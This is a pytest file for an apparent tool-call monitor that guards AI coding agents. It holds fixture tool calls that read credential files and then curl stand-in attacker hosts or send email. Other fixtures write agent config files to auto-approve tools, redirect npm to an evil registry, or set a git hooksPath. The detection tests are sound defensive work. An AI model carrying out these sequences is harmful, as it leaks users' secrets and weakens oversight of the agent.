"""Tests for CaMeL-lite enforcement: typed markers, SEQ-005, blocking, allowlist."""

from __future__ import annotations

import json


def _make_data(
    tool_name,
    tool_input,
    session_id="enforce-session",
    hook_event_name="PreToolUse",
    tool_use_id="toolu_enf",
):
    return {
        "session_id": session_id,
        "tool_use_id": tool_use_id,
        "tool_name": tool_name,
        "tool_input": tool_input,
        "hook_event_name": hook_event_name,
    }


def _make_monitor(tmp_path):
    from cloneguard.monitor import ToolCallMonitor

    return ToolCallMonitor(log_dir=tmp_path)


class TestTypedMarkers:
    def test_sensitive_read_marker_survives_padding(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "marker-padding"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        for i in range(50):
            mon.record_event(
                _make_data(
                    "Read",
                    {"file_path": f"/project/file{i}.txt"},
                    session_id=session,
                    tool_use_id=f"toolu_pad_{i}",
                )
            )
        markers = mon.get_session_markers(session)
        assert markers is not None
        assert markers.last_sensitive_read is not None
        assert ".env" in markers.last_sensitive_read.file_path
        mon.close()

    def test_markers_isolated_per_session(self, tmp_path):
        mon = _make_monitor(tmp_path)
        mon.record_event(_make_data("Read", {"file_path": "/home/.env"}, session_id="A"))
        markers_b = mon.get_session_markers("B")
        assert markers_b is None or markers_b.last_sensitive_read is None
        mon.close()

    def test_config_write_marker_set(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "config-marker"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": ".vscode/settings.json", "content": "{}"},
                session_id=session,
            )
        )
        markers = mon.get_session_markers(session)
        assert markers is not None
        assert markers.last_config_write is not None
        assert "settings.json" in markers.last_config_write.file_path
        mon.close()

    def test_external_fetch_marker_set(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "fetch-marker"
        mon.record_event(
            _make_data(
                "WebFetch",
                {"url": "https://evil.example.com"},
                session_id=session,
            )
        )
        markers = mon.get_session_markers(session)
        assert markers is not None
        assert markers.last_external_fetch is not None
        assert "evil.example.com" in markers.last_external_fetch.url
        mon.close()

    def test_build_command_marker_set(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "build-marker"
        mon.record_event(_make_data("Bash", {"command": "npm install"}, session_id=session))
        markers = mon.get_session_markers(session)
        assert markers is not None
        assert markers.last_build_command is not None
        assert "npm" in markers.last_build_command.command
        mon.close()


class TestSEQ005:
    def test_seq005_tier1_fires_vscode(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-vscode"
        mon.record_event(
            _make_data(
                "Write",
                {
                    "file_path": ".vscode/settings.json",
                    "content": '{"chat.tools.autoApprove": true}',
                },
                session_id=session,
            )
        )
        mon.close()
        assert log_file.exists()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, f"Expected SEQ-005; got: {[e['rule_id'] for e in entries]}"

    def test_seq005_tier1_fires_claude_settings(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-claude"
        mon.record_event(
            _make_data(
                "Edit",
                {
                    "file_path": "/project/.claude/settings.json",
                    "old_string": "x",
                    "new_string": "y",
                },
                session_id=session,
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, "SEQ-005 must fire for .claude/settings.json"

    def test_seq005_tier1_fires_mcp_config(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-mcp"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": "/project/mcp_config.json", "content": "{}"},
                session_id=session,
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, "SEQ-005 must fire for mcp_config.json"

    def test_seq005_tier1_fires_cursor_mcp(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-cursor"
        mon.record_event(
            _make_data(
                "Write", {"file_path": ".cursor/mcp.json", "content": "{}"}, session_id=session
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, "SEQ-005 must fire for .cursor/mcp.json"

    def test_seq005_tier2_fires_npmrc_then_install(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-npmrc"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": ".npmrc", "content": "registry=https://evil.com"},
                session_id=session,
            )
        )
        mon.record_event(_make_data("Bash", {"command": "npm install"}, session_id=session))
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, "SEQ-005 Tier 2 must fire for .npmrc -> npm install"

    def test_seq005_tier2_fires_gitconfig_then_build(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-git"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": ".git/config", "content": "[core]\n\thooksPath = /tmp/evil"},
                session_id=session,
            )
        )
        mon.record_event(_make_data("Bash", {"command": "make"}, session_id=session))
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, "SEQ-005 Tier 2 must fire for .git/config -> make"

    def test_seq005_no_fire_normal_write(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-safe"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": "src/main.py", "content": "print('hello')"},
                session_id=session,
            )
        )
        mon.close()
        if log_file.exists():
            entries = [
                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
            ]
            seq005 = [
                e
                for e in entries
                if e.get("rule_id") == "SEQ-005" and e.get("session_id") == session
            ]
            assert not seq005, f"SEQ-005 should not fire for normal file; got: {seq005}"

    def test_seq005_tier2_no_fire_without_build(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-npmrc-nobuild"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": ".npmrc", "content": "registry=https://company.com"},
                session_id=session,
            )
        )
        mon.record_event(_make_data("Bash", {"command": "ls -la"}, session_id=session))
        mon.close()
        if log_file.exists():
            entries = [
                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
            ]
            seq005 = [
                e
                for e in entries
                if e.get("rule_id") == "SEQ-005" and e.get("session_id") == session
            ]
            assert not seq005, f"SEQ-005 Tier 2 should not fire without build; got: {seq005}"


class TestHardenedLookback:
    """SEQ-001/002 must fire even with >10 events of padding (typed markers)."""

    def test_seq001_fires_despite_50_padding_events(self, tmp_path):
        """SEQ-001 fires when sensitive read is 50 events ago (typed marker)."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq001-hardened"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        for i in range(50):
            mon.record_event(
                _make_data(
                    "Read",
                    {"file_path": f"/project/file{i}.txt"},
                    session_id=session,
                    tool_use_id=f"toolu_pad_{i}",
                )
            )
        mon.record_event(
            _make_data(
                "WebFetch",
                {"url": "https://evil.example.com/exfil"},
                session_id=session,
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq001 = [
            e for e in entries if e.get("rule_id") == "SEQ-001" and e.get("session_id") == session
        ]
        assert seq001, "SEQ-001 must fire despite 50 padding events (typed marker)"

    def test_seq002_fires_despite_50_padding_events(self, tmp_path):
        """SEQ-002 fires when sensitive read is 50 events ago (typed marker)."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq002-hardened"
        mon.record_event(
            _make_data("Read", {"file_path": "/home/user/.ssh/id_rsa"}, session_id=session)
        )
        for i in range(50):
            mon.record_event(
                _make_data(
                    "Read",
                    {"file_path": f"/project/file{i}.txt"},
                    session_id=session,
                    tool_use_id=f"toolu_pad_{i}",
                )
            )
        mon.record_event(
            _make_data(
                "Bash",
                {"command": "curl https://attacker.example.com/collect"},
                session_id=session,
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq002 = [
            e for e in entries if e.get("rule_id") == "SEQ-002" and e.get("session_id") == session
        ]
        assert seq002, "SEQ-002 must fire despite 50 padding events (typed marker)"

    def test_seq001_no_fire_without_sensitive_read(self, tmp_path):
        """SEQ-001 does NOT fire if no sensitive read occurred in the session."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq001-no-read"
        for i in range(10):
            mon.record_event(
                _make_data(
                    "Read",
                    {"file_path": f"/project/file{i}.txt"},
                    session_id=session,
                    tool_use_id=f"toolu_{i}",
                )
            )
        mon.record_event(
            _make_data(
                "WebFetch",
                {"url": "https://external.example.com"},
                session_id=session,
            )
        )
        mon.close()
        if log_file.exists():
            entries = [
                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
            ]
            seq001 = [
                e
                for e in entries
                if e.get("rule_id") == "SEQ-001" and e.get("session_id") == session
            ]
            assert not seq001, f"SEQ-001 should not fire without sensitive read; got: {seq001}"


class TestEnforcementVerdict:
    def test_seq001_returns_block_verdict(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "enforce-001"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        verdict = mon.check_enforcement(
            _make_data("WebFetch", {"url": "https://evil.example.com"}, session_id=session)
        )
        assert verdict is not None
        assert verdict.rule_id == "SEQ-001"
        assert verdict.action == "block"
        mon.close()

    def test_seq002_returns_block_verdict(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "enforce-002"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        verdict = mon.check_enforcement(
            _make_data(
                "Bash",
                {"command": "curl https://evil.example.com"},
                session_id=session,
            )
        )
        assert verdict is not None
        assert verdict.rule_id == "SEQ-002"
        assert verdict.action == "block"
        mon.close()

    def test_seq003_returns_no_verdict(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "enforce-003"
        for i in range(6):
            mon.record_event(
                _make_data(
                    "mcp__tool__action",
                    {"data": f"chunk{i}"},
                    session_id=session,
                    tool_use_id=f"toolu_{i}",
                )
            )
        verdict = mon.check_enforcement(
            _make_data(
                "mcp__tool__action",
                {"data": "chunk6"},
                session_id=session,
                tool_use_id="toolu_6",
            )
        )
        assert verdict is None
        mon.close()

    def test_seq004_returns_no_verdict(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "enforce-004"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": "package.json", "content": "{}"},
                session_id=session,
            )
        )
        verdict = mon.check_enforcement(
            _make_data("Bash", {"command": "npm install"}, session_id=session)
        )
        assert verdict is None
        mon.close()

    def test_seq005_tier1_returns_block_verdict(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "enforce-005"
        verdict = mon.check_enforcement(
            _make_data(
                "Write",
                {"file_path": ".vscode/settings.json", "content": "{}"},
                session_id=session,
            )
        )
        assert verdict is not None
        assert verdict.rule_id == "SEQ-005"
        assert verdict.action == "block"
        mon.close()

    def test_allowlisted_domain_returns_none(self, tmp_path):
        from cloneguard.sequence_allowlist import SequenceAllowlist

        al = SequenceAllowlist(allowlist_file=tmp_path / "seq_allowlist.json")
        al.add_domain_rule("SEQ-001", "vault.company.com")
        mon = _make_monitor(tmp_path)
        mon._sequence_allowlist = al
        session = "enforce-allowed"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        verdict = mon.check_enforcement(
            _make_data(
                "WebFetch",
                {"url": "https://vault.company.com/api/secrets"},
                session_id=session,
            )
        )
        assert verdict is None, "Allowlisted domain should not trigger enforcement"
        mon.close()

    def test_allowlisted_path_returns_none(self, tmp_path):
        from cloneguard.sequence_allowlist import SequenceAllowlist

        al = SequenceAllowlist(allowlist_file=tmp_path / "seq_allowlist.json")
        al.add_path_rule("SEQ-005", ".vscode/settings.json")
        mon = _make_monitor(tmp_path)
        mon._sequence_allowlist = al
        session = "enforce-allowed-path"
        verdict = mon.check_enforcement(
            _make_data(
                "Write",
                {"file_path": ".vscode/settings.json", "content": "{}"},
                session_id=session,
            )
        )
        assert verdict is None, "Allowlisted path should not trigger enforcement"
        mon.close()

    def test_enforcement_never_raises(self, tmp_path):
        mon = _make_monitor(tmp_path)
        verdict = mon.check_enforcement({})
        assert verdict is None
        verdict = mon.check_enforcement({"garbage": True})
        assert verdict is None
        mon.close()


class TestExpandedSensitivePatterns:
    """Expanded sensitive file patterns catch cloud credentials."""

    def test_aws_credentials_detected(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "aws-creds"
        mon.record_event(
            _make_data("Read", {"file_path": "/home/user/.aws/credentials"}, session_id=session)
        )
        markers = mon.get_session_markers(session)
        assert markers.last_sensitive_read is not None
        mon.close()

    def test_kube_config_detected(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "kube"
        mon.record_event(
            _make_data("Read", {"file_path": "/home/user/.kube/config"}, session_id=session)
        )
        markers = mon.get_session_markers(session)
        assert markers.last_sensitive_read is not None
        mon.close()

    def test_gcp_credentials_detected(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "gcp"
        mon.record_event(
            _make_data(
                "Read",
                {"file_path": "/home/user/.config/gcloud/application_default_credentials.json"},
                session_id=session,
            )
        )
        markers = mon.get_session_markers(session)
        assert markers.last_sensitive_read is not None
        mon.close()

    def test_docker_config_detected(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "docker"
        mon.record_event(
            _make_data("Read", {"file_path": "/home/user/.docker/config.json"}, session_id=session)
        )
        markers = mon.get_session_markers(session)
        assert markers.last_sensitive_read is not None
        mon.close()

    def test_pem_file_detected(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "pem"
        mon.record_event(
            _make_data("Read", {"file_path": "/etc/ssl/private/server.pem"}, session_id=session)
        )
        markers = mon.get_session_markers(session)
        assert markers.last_sensitive_read is not None
        mon.close()

    def test_netrc_detected(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "netrc"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.netrc"}, session_id=session))
        markers = mon.get_session_markers(session)
        assert markers.last_sensitive_read is not None
        mon.close()

    def test_normal_file_not_sensitive(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "normal"
        mon.record_event(
            _make_data("Read", {"file_path": "/project/src/keyboard.py"}, session_id=session)
        )
        markers = mon.get_session_markers(session)
        assert markers is None or markers.last_sensitive_read is None
        mon.close()


class TestBashConfigMove:
    """SEQ-005 catches mv/cp to agent config paths via Bash."""

    def test_mv_to_vscode_settings(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "mv-vscode"
        mon.record_event(
            _make_data(
                "Bash", {"command": "mv /tmp/evil.json .vscode/settings.json"}, session_id=session
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, "SEQ-005 must fire for mv to .vscode/settings.json"

    def test_cp_to_claude_settings(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "cp-claude"
        mon.record_event(
            _make_data(
                "Bash", {"command": "cp /tmp/config.json .claude/settings.json"}, session_id=session
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, "SEQ-005 must fire for cp to .claude/settings.json"

    def test_mv_to_mcp_config(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "mv-mcp"
        mon.record_event(
            _make_data("Bash", {"command": "mv /tmp/x.json mcp_config.json"}, session_id=session)
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, "SEQ-005 must fire for mv to mcp_config.json"

    def test_mv_to_normal_file_no_fire(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "mv-safe"
        mon.record_event(
            _make_data("Bash", {"command": "mv /tmp/data.json src/config.json"}, session_id=session)
        )
        mon.close()
        if log_file.exists():
            entries = [
                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
            ]
            seq005 = [
                e
                for e in entries
                if e.get("rule_id") == "SEQ-005" and e.get("session_id") == session
            ]
            assert not seq005


class TestSEQ006:
    """SEQ-006: Sensitive read -> MCP exfil-capable tool (advisory)."""

    def test_seq006_fires_send_email(self, tmp_path):
        """SEQ-006 fires when sensitive read is followed by mcp__gmail__send_email."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq006-email"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        mon.record_event(
            _make_data(
                "mcp__gmail__send_email",
                {"to": "evil@example.com", "body": "secrets"},
                session_id=session,
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq006 = [e for e in entries if e.get("rule_id") == "SEQ-006"]
        assert seq006, "SEQ-006 must fire for sensitive read -> mcp send_email"

    def test_seq006_fires_create_pr(self, tmp_path):
        """SEQ-006 fires when sensitive read is followed by mcp__github__create_pull_request."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq006-pr"
        mon.record_event(
            _make_data("Read", {"file_path": "/home/user/.ssh/id_rsa"}, session_id=session)
        )
        mon.record_event(
            _make_data(
                "mcp__github__create_pull_request",
                {"title": "update", "body": "data"},
                session_id=session,
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq006 = [e for e in entries if e.get("rule_id") == "SEQ-006"]
        assert seq006, "SEQ-006 must fire for sensitive read -> mcp create_pull_request"

    def test_seq006_fires_post_comment(self, tmp_path):
        """SEQ-006 fires for mcp tool with 'comment' in name."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq006-comment"
        mon.record_event(
            _make_data("Read", {"file_path": "/home/user/.aws/credentials"}, session_id=session)
        )
        mon.record_event(
            _make_data(
                "mcp__jira__post_comment",
                {"issue": "PROJ-1", "body": "data"},
                session_id=session,
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq006 = [e for e in entries if e.get("rule_id") == "SEQ-006"]
        assert seq006, "SEQ-006 must fire for sensitive read -> mcp post_comment"

    def test_seq006_fires_despite_padding(self, tmp_path):
        """SEQ-006 uses typed markers -- fires despite 50 padding events."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq006-padding"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        for i in range(50):
            mon.record_event(
                _make_data(
                    "Read",
                    {"file_path": f"/project/file{i}.txt"},
                    session_id=session,
                    tool_use_id=f"pad_{i}",
                )
            )
        mon.record_event(
            _make_data(
                "mcp__slack__send_message",
                {"channel": "#general", "text": "leaked"},
                session_id=session,
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq006 = [
            e for e in entries if e.get("rule_id") == "SEQ-006" and e.get("session_id") == session
        ]
        assert seq006, "SEQ-006 must fire despite 50 padding events (typed marker)"

    def test_seq006_no_fire_without_sensitive_read(self, tmp_path):
        """SEQ-006 does NOT fire if no sensitive read in session."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq006-no-read"
        mon.record_event(
            _make_data("Read", {"file_path": "/project/README.md"}, session_id=session)
        )
        mon.record_event(
            _make_data(
                "mcp__gmail__send_email",
                {"to": "user@example.com"},
                session_id=session,
            )
        )
        mon.close()
        if log_file.exists():
            entries = [
                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
            ]
            seq006 = [
                e
                for e in entries
                if e.get("rule_id") == "SEQ-006" and e.get("session_id") == session
            ]
            assert not seq006, "SEQ-006 should not fire without sensitive read"

    def test_seq006_no_fire_read_only_mcp(self, tmp_path):
        """SEQ-006 does NOT fire for MCP tools without exfil keywords."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq006-read-mcp"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        mon.record_event(
            _make_data(
                "mcp__github__list_issues",
                {"repo": "owner/repo"},
                session_id=session,
            )
        )
        mon.close()
        if log_file.exists():
            entries = [
                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
            ]
            seq006 = [
                e
                for e in entries
                if e.get("rule_id") == "SEQ-006" and e.get("session_id") == session
            ]
            assert not seq006, "SEQ-006 should not fire for read-only MCP tools (list_issues)"

    def test_seq006_no_fire_non_mcp_tool(self, tmp_path):
        """SEQ-006 does NOT fire for non-MCP tools even with exfil keywords."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq006-non-mcp"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        mon.record_event(_make_data("send_message", {"to": "user"}, session_id=session))
        mon.close()
        if log_file.exists():
            entries = [
                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
            ]
            seq006 = [
                e
                for e in entries
                if e.get("rule_id") == "SEQ-006" and e.get("session_id") == session
            ]
            assert not seq006, "SEQ-006 should only fire for mcp__* tools"

    def test_seq006_is_advisory_not_enforcement(self, tmp_path):
        """SEQ-006 should NOT block (not in _ENFORCEMENT_RULES)."""
        mon = _make_monitor(tmp_path)
        session = "seq006-advisory"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        verdict = mon.check_enforcement(
            _make_data(
                "mcp__gmail__send_email",
                {"to": "evil@example.com"},
                session_id=session,
            )
        )
        assert verdict is None, "SEQ-006 must be advisory-only (not in _ENFORCEMENT_RULES)"
        mon.close()
